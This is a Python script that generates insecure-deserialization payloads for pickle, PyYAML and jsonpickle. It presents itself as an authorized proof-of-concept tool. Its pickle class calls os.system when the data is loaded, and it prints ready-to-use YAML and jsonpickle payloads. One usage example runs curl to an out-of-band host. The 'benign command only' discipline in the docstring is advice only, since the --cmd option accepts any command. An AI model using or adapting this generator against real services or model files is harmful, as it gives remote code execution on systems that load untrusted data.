#!/usr/bin/env python3
"""
pickle_poc.py — authorized Python deserialization payload generator (pickle / PyYAML / jsonpickle).

Builds a payload that runs a command when the target does pickle.loads / yaml.load(unsafe) / jsonpickle.decode on it.
Default command is BENIGN (`id`) — a read-only proof of execution. For a clean blind confirm, use --dns <token> to run
`nslookup <token>` (watch your OOB). ML model files (.pkl/.pt/.joblib) load via pickle, so a loaded model is a sink too.

Discipline: ONE benign command (id / nslookup <token>), then STOP. No shells, no data access, no persistence. Authorized only.

Usage:
  python3 pickle_poc.py                                  # base64 pickle running `id`
  python3 pickle_poc.py --dns UNIQUE.YOUR-OOB            # blind confirm via nslookup
  python3 pickle_poc.py --cmd 'curl http://YOUR-OOB/py' --format pickle
  python3 pickle_poc.py --format yaml --cmd id
  python3 pickle_poc.py --format jsonpickle --cmd id
"""
import argparse, base64, pickle, sys


class _Exec:
    """__reduce__ returns (callable, args) which pickle executes on load."""
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", help="command to run (default: id). Keep it benign.")
    ap.add_argument("--dns", help="OOB token -> builds `nslookup <token>` (blind confirm, benign)")
    ap.add_argument("--format", choices=["pickle", "yaml", "jsonpickle"], default="pickle")
    ap.add_argument("--raw", action="store_true", help="pickle: print raw bytes to stdout instead of base64")
    a = ap.parse_args()

    cmd = a.cmd or (f"nslookup {a.dns}" if a.dns else "id")

    if a.format == "pickle":
        payload = pickle.dumps(_Exec(cmd))
        if a.raw:
            sys.stdout.buffer.write(payload)
        else:
            print(base64.b64encode(payload).decode())
        print(f"\n[i] pickle running: {cmd!r}  -> drop into a pickle.loads() sink (cookie/param/model file). Benign proof only.",
              file=sys.stderr)
    elif a.format == "yaml":
        # PyYAML unsafe loader (yaml.load pre-5.1 / Loader=FullLoader-not-safe)
        print(f'!!python/object/apply:os.system ["{cmd}"]')
        print(f"\n[i] PyYAML unsafe-loader payload running: {cmd!r}", file=sys.stderr)
    else:  # jsonpickle
        print('{"py/object": "__builtin__.eval", "py/reduce": [{"py/function": "os.system"}, ["%s"]]}' % cmd)
        print(f"\n[i] jsonpickle payload running: {cmd!r}", file=sys.stderr)


if __name__ == "__main__":
    main()
